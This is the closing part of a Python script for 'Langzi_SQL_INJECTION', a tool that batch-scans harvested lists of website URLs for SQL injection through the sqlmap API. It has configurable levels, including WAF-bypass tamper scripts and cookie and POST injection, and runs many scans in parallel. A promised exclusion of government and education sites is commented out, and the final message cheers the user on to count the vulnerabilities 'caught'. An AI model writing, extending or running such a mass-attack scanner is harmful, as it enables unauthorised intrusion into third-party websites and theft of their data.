                    <link rel="stylesheet" href='https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css'>
                </head>
                <div class="container">
                    <div class="navbar navbar-default">
                        <div class="navbar-header">
                            <a class="navbar-brand" href="#">LAnGZi</a>
                        </div>
                        <ul class="nav navbar-nav">
                            <li><a href="http://www.langzi.fun/Python%20%E6%89%B9%E9%87%8FSQL%E6%B3%A8%E5%85%A5%E6%89%AB%E6%8F%8F.html">项目地址</a>
                            </li>
                            <li>
                                <a href="http://www.langzi.fun/%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF.html">可拓展信息处理</a>
                            </li>
                            <li>
                                <a href="http://www.langzi.fun/Python%20%E6%89%AB%E6%8F%8FIP%E4%BB%A3%E7%90%86%E6%B1%A0.html">可拓展IP代理池</a>
                            </li>
                        </ul>
                
                    </div>
                </div>

            ''')
    multiprocessing.freeze_support()
    print('''

             _                           _
            | |                         (_)
            | |     __ _ _ __   __ _ _____
            | |    / _` | '_ \ / _` |_  / |
            | |___| (_| | | | | (_| |/ /| |
            |______\__,_|_| |_|\__, /___|_|
                                __/ |      Langzi_SQL_INJECTION
                               |___/       Version:3.8[特殊定制版]
                                           Datetime:2019-04-05

    ''')
    time.sleep(3)
    print('''
    
        Description:
            Langzi_SQL_INJECTION v3.8版本是一款批量检测SQL注入漏洞的自动化工具
            对采集导入网址根据设置扫描等级进行全自动化扫描检测生成漏洞报告
            通过SQLMAP提供的API实现批量注入检测，扫描结果可百分百完全复现
            支持伪静态注入，cookie注入，post注入，加载绕过WAF的Tamper检测注入
            适合6-80岁年龄段人群使用，简单，便捷，批量，自动生成检测结果
            [在网页爬行链接中随机检测三个链接注入]
        
        Level:
            level 0 : 仅仅使用BOOL类型的盲注检测
            level 1 : 使用多种类型判断注入方式
            level 2 : 支持cookie注入与post注入方式
            level 3 : 调用目录下绕过安全狗Tamper脚本检测
            level 4 : 调用Tamper绕过WAF加测cookie注入与post注入
            level 5 : 加载时间延迟与Tamper高风险等级注入
            level 6 : 调用0-5所有级别进行注入，直到成功完成注入检测
            
        Tips:    
            禁止对GOV-EDU进行检测(检测到则秒退)
            在WIN 7 下不兼容运行
            运行目录不能存在中文字符
    
    ''')
    time.sleep(6)
    New_start = input(('把采集的url文本拖拽进来:'))
    levels = int(input(('设置扫描等级(0/1/2/3/4/5/6):')))
    countss = int(input(('设置扫描进程数(2-36):')))
    p = multiprocessing.Pool(countss)
    list_ = list(set(
        [x.replace('\n', '') if x.startswith('http') else 'http://' + x.replace('\n', '') for x in
         open(New_start, 'r').readlines()]))
    # for x in list_:
    #     if 'gov.cn' in x:
    #         sys.exit()
    #     if 'edu.cn' in x:
    #         sys.exit()

    for x in list_:
        # p.apply(get_url_sql, args=(x, levels))
        p.apply_async(get_url_sql, args=(x, levels))
    p.close()
    p.join()
    print('浪子哥哥提醒您，此次任务扫完了哦，快去看看抓到了几个漏洞吧~')
    time.sleep(300)
    time.sleep(300)
    time.sleep(300)
    time.sleep(300)
    time.sleep(300)
    time.sleep(300)
    time.sleep(300)
